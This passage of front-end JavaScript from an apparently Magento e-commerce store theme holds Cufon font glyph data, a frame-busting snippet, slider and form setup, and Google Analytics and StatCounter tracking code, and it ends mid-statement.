u010b":5,"\u010d":5,"g":5,"\u011d":5,"\u011f":5,"\u0121":5,"\u0123":5,"o":5,"\u00f2":5,"\u00f3":5,"\u00f4":5,"\u00f5":5,"\u00f6":5,"\u00f8":5,"\u014d":5,"\u014f":5,"\u0151":5,"\u01ff":5,"A":18,"\u00c0":18,"\u00c1":18,"\u00c2":18,"\u00c3":18,"\u00c4":18,"\u00c5":18,"\u0100":18,"\u0102":18,"\u0104":18,"\u00c6":23,"\u01fc":23,"a":18,"\u00e0":18,"\u00e1":18,"\u00e2":18,"\u00e3":18,"\u00e4":18,"\u00e5":18,"\u0101":18,"\u0103":18,"\u0105":18,"\u00e6":23,"\u01fd":23,"J":13,"\u0132":13,"\u0134":13,"j":13,"\u0133":13,"\u0135":13,"\u0237":13,"S":3,"\u015a":3,"\u015c":3,"\u015e":3,"\u0160":3,"\u0218":3,"\u1e60":3,"s":3,"\u00df":3,"\u015b":3,"\u015d":3,"\u015f":3,"\u0161":3,"\u0219":3,"\u1e61":3}},"\u2012":{"d":"0,-110r0,-32r143,0r0,32r-143,0"},"\u2013":{"d":"0,-110r0,-32r180,0r0,32r-180,0","w":180},"\u2014":{"d":"0,-110r0,-32r360,0r0,32r-360,0","w":360},"\u2018":{"d":"37,-216r16,0r0,38r-39,0v-4,-34,8,-53,18,-74r16,0","w":66,"k":{"\u1e61":2,"\u1e60":2,"\u0237":14,"\u0219":2,"\u0218":2,"\u01ff":4,"\u01fe":4,"\u017e":1,"\u017d":1,"\u017c":1,"\u017b":1,"\u017a":1,"\u0179":1,"\u0161":2,"\u0160":2,"\u015f":2,"\u015e":2,"\u015d":2,"\u015c":2,"\u015b":2,"\u015a":2,"\u0151":4,"\u0150":4,"\u014f":4,"\u014e":4,"\u014d":4,"\u014c":4,"\u0135":14,"\u0134":14,"\u0133":14,"\u0132":14,"\u0123":4,"\u0122":4,"\u0121":4,"\u0120":4,"\u011f":4,"\u011e":4,"\u011d":4,"\u011c":4,"\u010d":4,"\u010c":4,"\u010b":4,"\u010a":4,"\u0109":4,"\u0108":4,"\u0107":4,"\u0106":4,"\u0105":22,"\u0104":22,"\u0103":22,"\u0102":22,"\u0101":22,"\u0100":22,"\u00f8":4,"\u00f6":4,"\u00f5":4,"\u00f4":4,"\u00f3":4,"\u00f2":4,"\u00e7":4,"\u00e5":22,"\u00e4":22,"\u00e3":22,"\u00e2":22,"\u00e1":22,"\u00e0":22,"\u00df":2,"\u00d8":4,"\u00d6":4,"\u00d5":4,"\u00d4":4,"\u00d3":4,"\u00d2":4,"\u00c7":4,"\u00c5":22,"\u00c4":22,"\u00c3":22,"\u00c2":22,"\u00c1":22,"\u00c0":22,"z":1,"s":2,"o":4,"j":14,"g":4,"c":4,"a":22,"Z":1,"S":2,"O":4,"J":14,"G":4,"C":4,"A":22,"\u0153":4,"\u0152":4,"x":1,"q":4,"X":1,"Q":4}},"\u2019":{"d":"30,-214r-16,0r0,-38r39,0v4,34,-8,53,-18,74r-16,0","w":66,"k":{"\u1e61":2,"\u1e60":2,"\u0237":14,"\u0219":2,"\u0218":2,"\u01ff":4,"\u01fe":4,"\u017e":1,"\u017d":1,"\u017c":1,"\u017b":1,"\u017a":1,"\u0179":1,"\u0161":2,"\u0160":2,"\u015f":2,"\u015e":2,"\u015d":2,"\u015c":2,"\u015b":2,"\u015a":2,"\u0151":4,"\u0150":4,"\u014f":4,"\u014e":4,"\u014d":4,"\u014c":4,"\u0135":14,"\u0134":14,"\u0133":14,"\u0132":14,"\u0123":4,"\u0122":4,"\u0121":4,"\u0120":4,"\u011f":4,"\u011e":4,"\u011d":4,"\u011c":4,"\u010d":4,"\u010c":4,"\u010b":4,"\u010a":4,"\u0109":4,"\u0108":4,"\u0107":4,"\u0106":4,"\u0105":22,"\u0104":22,"\u0103":22,"\u0102":22,"\u0101":22,"\u0100":22,"\u00f8":4,"\u00f6":4,"\u00f5":4,"\u00f4":4,"\u00f3":4,"\u00f2":4,"\u00e7":4,"\u00e5":22,"\u00e4":22,"\u00e3":22,"\u00e2":22,"\u00e1":22,"\u00e0":22,"\u00df":2,"\u00d8":4,"\u00d6":4,"\u00d5":4,"\u00d4":4,"\u00d3":4,"\u00d2":4,"\u00c7":4,"\u00c5":22,"\u00c4":22,"\u00c3":22,"\u00c2":22,"\u00c1":22,"\u00c0":22,"z":1,"s":2,"o":4,"j":14,"g":4,"c":4,"a":22,"Z":1,"S":2,"O":4,"J":14,"G":4,"C":4,"A":22,"\u0153":4,"\u0152":4,"x":1,"q":4,"X":1,"Q":4}},"\u201a":{"d":"30,0r-16,0r0,-38r39,0v4,34,-8,53,-18,74r-16,0","w":66,"k":{"\u1ef3":29,"\u1ef2":29,"\u1e85":14,"\u1e84":14,"\u1e83":14,"\u1e82":14,"\u1e81":14,"\u1e80":14,"\u1e6b":22,"\u1e6a":22,"\u1e61":2,"\u1e60":2,"\u021b":22,"\u021a":22,"\u0219":2,"\u0218":2,"\u01ff":4,"\u01fe":4,"\u0178":29,"\u0177":29,"\u0176":29,"\u0175":14,"\u0174":14,"\u0173":2,"\u0172":2,"\u0171":2,"\u0170":2,"\u016f":2,"\u016e":2,"\u016d":2,"\u016c":2,"\u016b":2,"\u016a":2,"\u0169":2,"\u0168":2,"\u0167":22,"\u0166":22,"\u0165":22,"\u0164":22,"\u0163":22,"\u0162":22,"\u0161":2,"\u0160":2,"\u015f":2,"\u015e":2,"\u015d":2,"\u015c":2,"\u015b":2,"\u015a":2,"\u0151":4,"\u0150":4,"\u014f":4,"\u014e":4,"\u014d":4,"\u014c":4,"\u0123":4,"\u0122":4,"\u0121":4,"\u0120":4,"\u011f":4,"\u011e":4,"\u011d":4,"\u011c":4,"\u010d":4,"\u010c":4,"\u010b":4,"\u010a":4,"\u0109":4,"\u0108":4,"\u0107":4,"\u0106":4,"\u00ff":29,"\u00fd":29,"\u00fc":2,"\u00fb":2,"\u00fa":2,"\u00f9":2,"\u00f8":4,"\u00f6":4,"\u00f5":4,"\u00f4":4,"\u00f3":4,"\u00f2":4,"\u00e7":4,"\u00df":2,"\u00dd":29,"\u00dc":2,"\u00db":2,"\u00da":2,"\u00d9":2,"\u00d8":4,"\u00d6":4,"\u00d5":4,"\u00d4":4,"\u00d3":4,"\u00d2":4,"\u00c7":4,"y":29,"w":14,"u":2,"t":22,"s":2,"o":4,"g":4,"c":4,"Y":29,"W":14,"U":2,"T":22,"S":2,"O":4,"G":4,"C":4,"\u0153":4,"\u0152":4,"v":22,"q":4,"V":22,"Q":4}},"\u201c":{"d":"37,-216r16,0r0,38r-39,0v-4,-34,8,-53,18,-74r16,0xm90,-216r15,0r0,38r-38,0v-3,-34,8,-53,17,-74r16,0","w":119,"k":{"\u1e61":2,"\u1e60":2,"\u0237":14,"\u0219":2,"\u0218":2,"\u01ff":4,"\u01fe":4,"\u017e":1,"\u017d":1,"\u017c":1,"\u017b":1,"\u017a":1,"\u0179":1,"\u0161":2,"\u0160":2,"\u015f":2,"\u015e":2,"\u015d":2,"\u015c":2,"\u015b":2,"\u015a":2,"\u0151":4,"\u0150":4,"\u014f":4,"\u014e":4,"\u014d":4,"\u014c":4,"\u0135":14,"\u0134":14,"\u0133":14,"\u0132":14,"\u0123":4,"\u0122":4,"\u0121":4,"\u0120":4,"\u011f":4,"\u011e":4,"\u011d":4,"\u011c":4,"\u010d":4,"\u010c":4,"\u010b":4,"\u010a":4,"\u0109":4,"\u0108":4,"\u0107":4,"\u0106":4,"\u0105":22,"\u0104":22,"\u0103":22,"\u0102":22,"\u0101":22,"\u0100":22,"\u00f8":4,"\u00f6":4,"\u00f5":4,"\u00f4":4,"\u00f3":4,"\u00f2":4,"\u00e7":4,"\u00e5":22,"\u00e4":22,"\u00e3":22,"\u00e2":22,"\u00e1":22,"\u00e0":22,"\u00df":2,"\u00d8":4,"\u00d6":4,"\u00d5":4,"\u00d4":4,"\u00d3":4,"\u00d2":4,"\u00c7":4,"\u00c5":22,"\u00c4":22,"\u00c3":22,"\u00c2":22,"\u00c1":22,"\u00c0":22,"z":1,"s":2,"o":4,"j":14,"g":4,"c":4,"a":22,"Z":1,"S":2,"O":4,"J":14,"G":4,"C":4,"A":22,"\u0153":4,"\u0152":4,"x":1,"q":4,"X":1,"Q":4}},"\u201d":{"d":"30,-214r-16,0r0,-38r39,0v4,34,-8,53,-18,74r-16,0xm82,-214r-15,0r0,-38r38,0v3,34,-8,53,-17,74r-16,0","w":119,"k":{"\u1e61":2,"\u1e60":2,"\u0237":14,"\u0219":2,"\u0218":2,"\u01ff":4,"\u01fe":4,"\u017e":1,"\u017d":1,"\u017c":1,"\u017b":1,"\u017a":1,"\u0179":1,"\u0161":2,"\u0160":2,"\u015f":2,"\u015e":2,"\u015d":2,"\u015c":2,"\u015b":2,"\u015a":2,"\u0151":4,"\u0150":4,"\u014f":4,"\u014e":4,"\u014d":4,"\u014c":4,"\u0135":14,"\u0134":14,"\u0133":14,"\u0132":14,"\u0123":4,"\u0122":4,"\u0121":4,"\u0120":4,"\u011f":4,"\u011e":4,"\u011d":4,"\u011c":4,"\u010d":4,"\u010c":4,"\u010b":4,"\u010a":4,"\u0109":4,"\u0108":4,"\u0107":4,"\u0106":4,"\u0105":22,"\u0104":22,"\u0103":22,"\u0102":22,"\u0101":22,"\u0100":22,"\u00f8":4,"\u00f6":4,"\u00f5":4,"\u00f4":4,"\u00f3":4,"\u00f2":4,"\u00e7":4,"\u00e5":22,"\u00e4":22,"\u00e3":22,"\u00e2":22,"\u00e1":22,"\u00e0":22,"\u00df":2,"\u00d8":4,"\u00d6":4,"\u00d5":4,"\u00d4":4,"\u00d3":4,"\u00d2":4,"\u00c7":4,"\u00c5":22,"\u00c4":22,"\u00c3":22,"\u00c2":22,"\u00c1":22,"\u00c0":22,"z":1,"s":2,"o":4,"j":14,"g":4,"c":4,"a":22,"Z":1,"S":2,"O":4,"J":14,"G":4,"C":4,"A":22,"\u0153":4,"\u0152":4,"x":1,"q":4,"X":1,"Q":4}},"\u201e":{"d":"30,0r-16,0r0,-38r39,0v4,34,-8,53,-18,74r-16,0xm82,0r-15,0r0,-38r38,0v3,34,-8,53,-17,74r-16,0","w":119,"k":{"\u1ef3":29,"\u1ef2":29,"\u1e85":14,"\u1e84":14,"\u1e83":14,"\u1e82":14,"\u1e81":14,"\u1e80":14,"\u1e6b":22,"\u1e6a":22,"\u1e61":2,"\u1e60":2,"\u021b":22,"\u021a":22,"\u0219":2,"\u0218":2,"\u01ff":4,"\u01fe":4,"\u0178":29,"\u0177":29,"\u0176":29,"\u0175":14,"\u0174":14,"\u0173":2,"\u0172":2,"\u0171":2,"\u0170":2,"\u016f":2,"\u016e":2,"\u016d":2,"\u016c":2,"\u016b":2,"\u016a":2,"\u0169":2,"\u0168":2,"\u0167":22,"\u0166":22,"\u0165":22,"\u0164":22,"\u0163":22,"\u0162":22,"\u0161":2,"\u0160":2,"\u015f":2,"\u015e":2,"\u015d":2,"\u015c":2,"\u015b":2,"\u015a":2,"\u0151":4,"\u0150":4,"\u014f":4,"\u014e":4,"\u014d":4,"\u014c":4,"\u0123":4,"\u0122":4,"\u0121":4,"\u0120":4,"\u011f":4,"\u011e":4,"\u011d":4,"\u011c":4,"\u010d":4,"\u010c":4,"\u010b":4,"\u010a":4,"\u0109":4,"\u0108":4,"\u0107":4,"\u0106":4,"\u00ff":29,"\u00fd":29,"\u00fc":2,"\u00fb":2,"\u00fa":2,"\u00f9":2,"\u00f8":4,"\u00f6":4,"\u00f5":4,"\u00f4":4,"\u00f3":4,"\u00f2":4,"\u00e7":4,"\u00df":2,"\u00dd":29,"\u00dc":2,"\u00db":2,"\u00da":2,"\u00d9":2,"\u00d8":4,"\u00d6":4,"\u00d5":4,"\u00d4":4,"\u00d3":4,"\u00d2":4,"\u00c7":4,"y":29,"w":14,"u":2,"t":22,"s":2,"o":4,"g":4,"c":4,"Y":29,"W":14,"U":2,"T":22,"S":2,"O":4,"G":4,"C":4,"\u0153":4,"\u0152":4,"v":22,"q":4,"V":22,"Q":4}},"\u2020":{"d":"9,-158r0,-31r46,0r0,-63r32,0r0,63r47,0r0,31r-47,0r0,181r-32,0r0,-181r-46,0"},"\u2021":{"d":"9,-158r0,-31r46,0r0,-63r32,0r0,63r47,0r0,31r-47,0r0,88r47,0r0,30r-47,0r0,63r-32,0r0,-63r-46,0r0,-30r46,0r0,-88r-46,0"},"\u2022":{"d":"21,-126v0,-28,22,-50,50,-50v28,0,50,22,50,50v0,28,-22,50,-50,50v-28,0,-50,-22,-50,-50"},"\u2026":{"d":"14,-38r39,0r0,38r-39,0r0,-38xm67,-38r38,0r0,38r-38,0r0,-38xm120,-38r38,0r0,38r-38,0r0,-38","w":172,"k":{"\u1ef3":29,"\u1ef2":29,"\u1e85":14,"\u1e84":14,"\u1e83":14,"\u1e82":14,"\u1e81":14,"\u1e80":14,"\u1e6b":22,"\u1e6a":22,"\u1e61":2,"\u1e60":2,"\u021b":22,"\u021a":22,"\u0219":2,"\u0218":2,"\u01ff":4,"\u01fe":4,"\u0178":29,"\u0177":29,"\u0176":29,"\u0175":14,"\u0174":14,"\u0173":2,"\u0172":2,"\u0171":2,"\u0170":2,"\u016f":2,"\u016e":2,"\u016d":2,"\u016c":2,"\u016b":2,"\u016a":2,"\u0169":2,"\u0168":2,"\u0167":22,"\u0166":22,"\u0165":22,"\u0164":22,"\u0163":22,"\u0162":22,"\u0161":2,"\u0160":2,"\u015f":2,"\u015e":2,"\u015d":2,"\u015c":2,"\u015b":2,"\u015a":2,"\u0151":4,"\u0150":4,"\u014f":4,"\u014e":4,"\u014d":4,"\u014c":4,"\u0123":4,"\u0122":4,"\u0121":4,"\u0120":4,"\u011f":4,"\u011e":4,"\u011d":4,"\u011c":4,"\u010d":4,"\u010c":4,"\u010b":4,"\u010a":4,"\u0109":4,"\u0108":4,"\u0107":4,"\u0106":4,"\u00ff":29,"\u00fd":29,"\u00fc":2,"\u00fb":2,"\u00fa":2,"\u00f9":2,"\u00f8":4,"\u00f6":4,"\u00f5":4,"\u00f4":4,"\u00f3":4,"\u00f2":4,"\u00e7":4,"\u00df":2,"\u00dd":29,"\u00dc":2,"\u00db":2,"\u00da":2,"\u00d9":2,"\u00d8":4,"\u00d6":4,"\u00d5":4,"\u00d4":4,"\u00d3":4,"\u00d2":4,"\u00c7":4,"y":29,"w":14,"u":2,"t":22,"s":2,"o":4,"g":4,"c":4,"Y":29,"W":14,"U":2,"T":22,"S":2,"O":4,"G":4,"C":4,"\u0153":4,"\u0152":4,"v":22,"q":4,"V":22,"Q":4}},"\u2030":{"d":"37,-215r0,86v0,11,5,16,13,16v8,0,13,-5,13,-16r0,-86v0,-11,-5,-16,-13,-16v-8,0,-13,5,-13,16xm50,-90v-55,2,-38,-73,-38,-123v0,-26,13,-41,38,-41v55,-2,39,73,39,123v0,26,-14,41,-39,41xm50,0r100,-252r23,0r-99,252r-24,0xm162,-122r0,86v0,11,5,16,13,16v8,0,13,-5,13,-16r0,-86v0,-11,-5,-16,-13,-16v-8,0,-13,5,-13,16xm175,3v-55,0,-38,-74,-38,-123v0,-26,13,-41,38,-41v55,-2,38,74,38,124v0,26,-13,40,-38,40xm255,-122r0,86v0,11,4,16,12,16v8,0,13,-5,13,-16r0,-86v0,-11,-5,-16,-13,-16v-8,0,-12,5,-12,16xm267,3v-55,0,-38,-74,-38,-123v0,-26,13,-41,38,-41v55,-2,39,74,39,124v0,26,-14,40,-39,40","w":317},"\u2039":{"d":"27,-222r38,0r-21,96r21,101r-38,0r-21,-101","w":70},"\u203a":{"d":"6,-222r37,0r22,96r-22,101r-37,0r21,-101","w":70},"\u2044":{"d":"-49,0r99,-252r23,0r-99,252r-23,0","w":24},"\u2070":{"d":"37,-215r0,86v0,11,5,16,13,16v8,0,13,-5,13,-16r0,-86v0,-11,-5,-16,-13,-16v-8,0,-13,5,-13,16xm50,-90v-55,2,-38,-73,-38,-123v0,-26,13,-41,38,-41v55,-2,39,73,39,123v0,26,-14,41,-39,41","w":100},"\u2074":{"d":"9,-121r0,-23r45,-108r28,0r0,108r12,0r0,23r-12,0r0,29r-25,0r0,-29r-48,0xm31,-144r26,0r0,-59","w":100},"\u20ac":{"d":"7,-137r0,-20r10,0v-4,-55,5,-98,58,-98v47,0,62,33,58,84r-38,0v0,-22,2,-51,-19,-48v-25,-3,-18,38,-19,62r55,0r0,20r-55,0r0,20r55,0r0,20r-55,0v1,25,-7,67,19,64v22,3,19,-28,19,-50r38,0v4,51,-10,86,-58,86v-53,0,-62,-44,-58,-100r-10,0r0,-20r10,0r0,-20r-10,0"},"\u2117":{"d":"7,-126v0,-75,54,-129,125,-129v71,0,126,54,126,129v0,75,-55,129,-126,129v-71,0,-125,-54,-125,-129xm33,-126v0,60,42,104,99,104v57,0,100,-44,100,-104v0,-60,-43,-104,-100,-104v-57,0,-99,44,-99,104xm99,-46r0,-154v52,-4,92,1,82,61v1,33,-20,43,-55,40r0,53r-27,0xm126,-124v24,4,28,-9,28,-32v0,-19,-11,-20,-28,-19r0,51","w":264},"\u2122":{"d":"131,-252r19,90r17,-90r35,0r0,128r-24,0r0,-91r-17,91r-23,0r-20,-90r0,90r-22,0r0,-128r35,0xm4,-229r0,-23r77,0r0,23r-26,0r0,105r-25,0r0,-105r-26,0","w":210},"\u2212":{"d":"9,-140r125,0r0,28r-125,0r0,-28"},"\u2248":{"d":"22,-72r-19,-18v28,-54,60,-23,94,-10v8,0,13,-6,24,-21r19,20v-29,54,-61,21,-95,9v-8,0,-12,5,-23,20xm22,-131r-19,-18v17,-26,29,-33,43,-33v33,0,53,45,75,2r19,19v-29,54,-61,21,-95,9v-8,0,-12,6,-23,21"},"\u221e":{"d":"124,-114v-12,0,-9,-13,-22,-8v-9,-1,-10,-14,-5,-21v-6,6,-3,21,-15,28v-16,9,1,22,0,28v-1,0,-4,-2,-4,-2v3,15,8,29,17,38r-20,0v-15,-54,-31,-168,51,-168v84,0,71,106,59,168r-26,0v13,-12,20,-27,22,-43v0,1,-3,3,-5,3v0,-5,6,-3,6,-14v-17,12,-60,-2,-87,7v-6,-1,-16,0,-19,-5v7,-14,95,-14,105,-4v2,-14,-21,-10,-18,-26v0,-4,0,-12,-5,-12v4,12,-6,26,-19,21v-2,0,-7,10,-15,10xm264,-105r0,54v-9,-20,-39,-64,-49,-64v2,21,0,44,-4,64r-16,0v10,-73,18,-186,-70,-187v-79,-1,-77,127,-58,187r-17,0v-6,-22,-7,-44,-7,-67v-14,8,-34,53,-43,67r0,-54v9,-22,33,-41,41,-49v2,-49,27,-103,80,-103v67,0,85,48,92,100v9,2,37,24,51,52xm124,-184v1,0,5,6,15,6v16,0,25,-11,19,-2v4,0,12,1,18,4v-6,-18,-20,-29,-50,-29v-28,0,-45,19,-51,42v8,-4,17,-11,14,-18v1,6,35,10,35,-3xm136,-145v-5,-5,0,-24,-7,-26v-9,2,-4,38,-20,26v-8,-1,-15,15,-6,17v13,-7,9,0,21,5v13,-10,24,2,29,-17v1,-11,-13,-11,-17,-5xm184,-114v-2,-19,1,-42,-7,-54v0,21,-40,18,-40,0v3,-4,-3,-3,-5,-5v7,10,2,25,13,20v12,1,25,12,23,23v0,3,12,5,16,16xm175,-105v-13,-10,-78,-8,-90,1v10,11,32,-3,43,-1v16,-1,37,7,47,0xm74,-114v16,-11,12,-35,37,-36v4,0,3,-12,12,-22r-5,1v3,20,-33,30,-38,11v-14,5,-5,29,-6,46xm158,-175v-2,15,-16,-2,-17,8v2,12,31,11,32,-2v0,-4,-9,-6,-15,-6xm84,-162v4,15,27,7,29,-4v-3,-12,-16,7,-22,-1v-2,2,-4,4,-7,5xm167,-106v-20,1,-52,-2,-72,1v10,-5,60,-5,72,-1xm110,-94v5,-4,27,-7,34,-1v-6,1,-27,0,-34,1xm150,-170v2,0,3,-2,3,-5v-3,-1,-7,4,-3,5xm93,-169v5,2,8,-2,2,-3v0,1,-1,2,-2,3xm121,-12v-10,1,-5,-12,-7,-18r-2,30r-8,0r5,-45r9,0r2,22v5,-8,1,-25,16,-22r-5,45r-7,0r3,-30xm20,-45v13,8,9,54,-17,45r4,-45r13,0xm83,-45v26,-8,23,26,14,35v1,5,6,12,-4,10v-1,-7,-6,-11,-6,0r-9,0xm66,0v0,-4,3,-10,-4,-8r-1,8r-8,0v5,-16,-6,-47,18,-45v15,5,2,31,3,45r-8,0xm149,0v0,-4,3,-10,-4,-8r-1,8r-8,0v5,-16,-5,-47,18,-45v15,5,2,31,3,45r-8,0xm212,0r6,-45v9,0,21,-2,20,8v-3,11,2,32,-16,29r-1,8r-9,0xm40,0v0,-3,3,-10,-3,-8r-1,8r-9,0r6,-45r7,0r-3,30r5,0r3,-30r8,0r-5,45r-8,0xm192,-45r8,0v1,9,-7,25,0,30v5,-6,3,-21,5,-30r7,0v-3,12,3,35,-9,37v-2,5,-4,10,-12,8r3,-8v-11,-4,-1,-26,-2,-37xm183,-38r-4,38r-8,0r4,-38v-6,1,-5,-3,-4,-7r18,0v0,4,0,8,-6,7xm15,-6v2,-8,4,-24,3,-32r-4,0r-3,32r4,0xm222,-15v9,1,6,-18,6,-23r-3,0xm62,-15v10,1,7,-17,7,-23v-10,0,-5,15,-7,23xm88,-15v9,1,6,-18,6,-23r-3,0xm146,-15v7,0,9,-21,4,-23v-5,4,-2,16,-4,23xm256,-21v0,6,-2,8,-9,7r0,8r10,0v1,10,-12,5,-19,6r5,-45r18,0v1,7,-4,8,-11,7r-2,17r8,0","w":263}}});

Cufon.replace('h1', {fontFamily: 'Bebas Neue'});
Cufon.replace('h2', {fontFamily: 'Bebas Neue'});
Cufon.replace('h3', {fontFamily: 'Bebas Neue'});
Cufon.replace('h4', {fontFamily: 'Bebas Neue'});
Cufon.replace('#nav > li > a', {fontFamily: 'Bebas Neue'});
Cufon.replace('.product-name', {fontFamily: 'Bebas Neue'});
Cufon.replace('.caption.slide-head', {fontFamily: 'Bebas Neue'});
Cufon.replace('.caption.slide-slogan', {fontFamily: 'Bebas Neue'});
Cufon.replace('.block-account .block-title', {fontFamily: 'Bebas Neue'});
Cufon.replace('.block.left-categorys .block-title h2', {fontFamily: 'Bebas Neue'});

  (function() {
    var externallyFramed = false;
    try {
      externallyFramed = top.location.host != location.host;
    }
    catch(err) {
      externallyFramed = true;
    }
    if(externallyFramed) {
      top.location = 'http://8theme.com/site_demo#blanco';
    }
  })();
    var active_color_selector = '#nav > li.over > a > span,#nav > li:hover > a > span,#nav > li.active > a > span,.product-tabs li.active a,a:hover,#nav > li > ul > li.parent > a:hover,.footer-container a:hover,.block-layered-nav dd a:hover,.blocklist > li > ul > li a:hover,#nav > li > ul > li ul > li a:hover,.block-account .block-content li.current strong,.form-search button.button:hover,.special-price .price,.product-tabs li a:hover,.products-grid li.item:hover a,.newproducts li.item:hover a,.related li.item:hover a,.saleproduct,.special-price .price';
    var active_bg_selector = '.pages li a:hover,.pages .current, button.button:hover,#banner-rotator .tintButton:hover,.footer-container .form-subscribe button.button,.add-to-cart button.button,#added a:hover,button.button.btn-checkout,.opc .active .step-title,a.readmore,#added a,.quantity_box_button_up:hover,.quantity_box_button_down:hover,.left-categorys-container a:hover,.home-text a.readmore,.box-tags button.button,#banner-rotator .tintButton,.blocklist > li > ul > li:hover, #nav > li > ul > li ul > li:hover,.block.left-categorys .block-title';
    var active_border_selector = '.etheme_cp .etheme_cp_content .etheme_cp_section .pattern_select.selected,.product-view .product-img-box .more-views li a.thumbnail-active';
    var active_color_default = 'FF4A4A';
    var bg_default = 'fff'; 
    var pattern_default = 'url(http://india-shopping.khazano.com/media/wysiwyg/blanco/)';


    if(slide_on){
    	jQuery(document).ready(function($) {		
    		$('#banner-rotator').royalSlider({			
    	   		imageAlignCenter:true,
    	   		hideArrowOnLastSlide:true,
    	   		slideSpacing:20,
                slideshowEnabled:true,
                slideshowDelay:8000    	    });		
    	});  
    }


        jQuery(document).ready(function (){
        	jQuery('.toolbar').jqTransform({imgPath:'http://india-shopping.khazano.com/skin/frontend/default/blanco/images/jqforms/'});
        	jQuery('.limiter').jqTransform({imgPath:'http://india-shopping.khazano.com/skin/frontend/default/blanco/images/jqforms/'});
        });  


//<![CDATA[
    var _gaq = _gaq || [];
    
_gaq.push(['_setAccount', 'UA-38217337-1']);
_gaq.push(['_trackPageview']);
    
    (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();

//]]>


        //<![CDATA[
            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Search entire store here...');
            searchForm.initAutocomplete('http://india-shopping.khazano.com/catalogsearch/ajax/suggest/', 'search_autocomplete');
        //]]>
        

//<![CDATA[
    function validatePollAnswerIsSelected()
    {
        var options = $$('input.poll_vote');
        for( i in options ) {
            if( options[i].checked == true ) {
                return true;
            }
        }
        return false;
    }
//]]>

decorateList('poll-answers');

//<![CDATA[
    var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
    new Varien.searchForm('newsletter-validate-detail', 'newsletter', 'Enter your email address');
//]]>

// <![CDATA[
var sc_project=379047; 
var sc_invisible=1; 
var sc_security="";
// ]]>
var sc_width=screen.width;var sc_height=screen.height;var sc_referer=""+document.referrer;try{sc_referer=""+parent.document.referrer}catch(ex){sc_referer=""+document.referrer}if(typeof sc_referer_scr08!=="undefined"){sc_referer=sc_referer_scr08}var sc_unique=0;var sc_returning=0;var sc_returns=0;var sc_error=0;var sc_remove=0;var sc_cls=-1;var sc_inv=0;var sc_os="";var sc_title="";var sc_url="";var sc_base_dir="";var sc_click_dir="";var sc_link_back_start="";var sc_link_back_end="";var sc_security_code="";var sc_http_url="http";var sc_host="statcounter.com";var sc_dc="c";var sc_alt_text="StatCounter - Free Web Tracker and Counter";var sc_counter_size="";var sc_prerendering=0;var sc_uuid="";var sc_uuid_q="&u1=za";var sc_unique_returning="";var sc_sp="cookie";if(window.sc_client_storage){sc_sp=window.sc_client_storage}if(typeof window.sc_first_party_cookie!="undefined"&&sc_first_party_cookie=="0"){sc_sp="disabled"}function _sc_strip_tags(_1,_2){_2=(((_2||"")+"").toLowerCase().match(/<[a-z][a-z0-9]*>/g)||[]).join("");var _3=/<\/?([a-z][a-z0-9]*)\b[^>]*>/gi,_4=/<!--[\s\S]*?-->|<\?(?:php)?[\s\S]*?\?>/gi;return _1.replace(_4,"").replace(_3,function($0,$1){return _2.indexOf("<"+$1.toLowerCase()+">")>-1?$0:""})}function _sc_sanitiseTags(_7){for(i=0;i<_7.length;i++){_7[i]=(""+_7[i]).trim()}return _7}function _sc_validateTags(_8){var _9=10;var _a=1;var _b=300;var _c=[];if(!(_8.length%2==0)){_c.push("Every tag must have a name and value.")}else{if(_8.length/2>_9){_c.push("No more than "+_9+" tags can be passed - "+_8.length/2+" passed.")}for(i=0;i<_8.length;i++){var _d=(""+_8[i]).length;if(_d<_a||_d>_b){_c.push("Tag names and values must be between "+_a+" and "+_b+" characters in length ('"+_8[i]+"' is "+_8[i].length+" characters long).")}}for(i=0;i<_8.length;i++){if(_sc_strip_tags(""+_8[i])!=""+_8[i]){_c.push("Tag names and values may not contain HTML tags.")}}}if(_c.length!=0){for(i=0;i<_c.length;i++){}return false}return true}function getTagString(_e){function _f(obj,_11){var _12=obj.__proto__||obj.constructor.prototype;return (_11 in obj)&&(!(_11 in _12)||_12[_11]!==obj[_11])}if(Object.prototype.hasOwnProperty){var _f=function(obj,_14){return obj.hasOwnProperty(_14)}}var _15="";if(_f(_e,"tags")&&typeof _e.tags==="object"){var _16=[];for(var tag in _e.tags){_16[_16.length]=tag;_16[_16.length]=_e.tags[tag]}if(_sc_validateTags(_16)){_16=_sc_sanitiseTags(_16);for(i=0;i<_16.length;i=i+2){_15+="&sc_ev_"+encodeURIComponent(_16[i])+"="+encodeURIComponent(_16[i+1])}}}return _15}function isValidEventName(_18){if(_18!==null&&_18!=""){return true}return false}var _statcounter_pending=_statcounter;var _statcounter={push:function(_19){if(_19!==null&&typeof _19==="object"){function hasOwnProperty(obj,_1b){var _1c=obj.__proto__||obj.constructor.prototype;return (_1b in obj)&&(!(_1b in _1c)||_1c[_1b]!==obj[_1b])}if(Object.prototype.hasOwnProperty){var _1d=function(obj,_1f){return obj.hasOwnProperty(_1f)}}if(_1d(_19,"name")&&isValidEventName(_19.name)){var _20=_19.name;if(_20=="pageview"){_statcounter_pending.push(_19);return}var _21=getTagString(_19);var _22=3;var _23=sc_click_dir+"click.gif?sc_project="+clickstat_project+"&security="+clickstat_security+"&m="+_22+"&u="+sc_url+"&t="+sc_title+"&en="+_20+"&sess=4ea83c&rand="+Math.random()+_21+sc_uuid_q+sc_unique_returning;var _24=new Image();_24.onload=sc_none;_24.src=_23;sc_delay()}}}};if(window.sc_invisible){if(window.sc_invisible==1){sc_inv=1}}if(window.sc_click_stat){sc_cls=window.sc_click_stat}sc_doc_loc=""+document.location;myRE=new 